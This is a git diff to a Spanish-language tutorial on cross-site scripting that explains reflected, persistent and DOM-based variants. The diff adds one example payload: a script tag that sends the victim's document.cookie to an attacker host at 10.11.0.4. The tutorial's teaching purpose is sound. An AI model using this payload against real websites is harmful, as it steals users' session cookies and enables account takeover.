@@ -20,6 +20,11 @@ Existen dos tipos:
 En ambos casos, el atacante malicioso inyecta código sobre algún campo de entrada de datos que ofrezca la página web,
 bien sea este la típica cajita con el icono de la lupa para búsqueda de palabras clave, un recuadro de espacio de participación en un foro, o un formulario de recogida de datos.
 
+```
+Ejemplo:
+    * <script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
+```
+
 # Cross Site Scripting persistente
 Si el código que hemos insertado se queda almacenado en el servidor, por ejemplo formando parte de una contribución en un foro,
 el ataque se dice que es persistente. Cualquier usuario que entre a leer dicha contribución leerá el texto inocente pero probablemente no así el código inyectado,
@@ -45,3 +50,5 @@ Si estos métodos se proporcionan con una entrada que no es de confianza, existe
 Por ejemplo, se puede inyectar código HTML malicioso a través del innerHTMLmétodo JavaScript, que generalmente se usa para representar código HTML insertado por el usuario.
 Si las cadenas no se desinfectan correctamente, el método puede habilitar la inyección de HTML.
 Una función de JavaScript que se puede utilizar para este propósito es document.write().
+
+
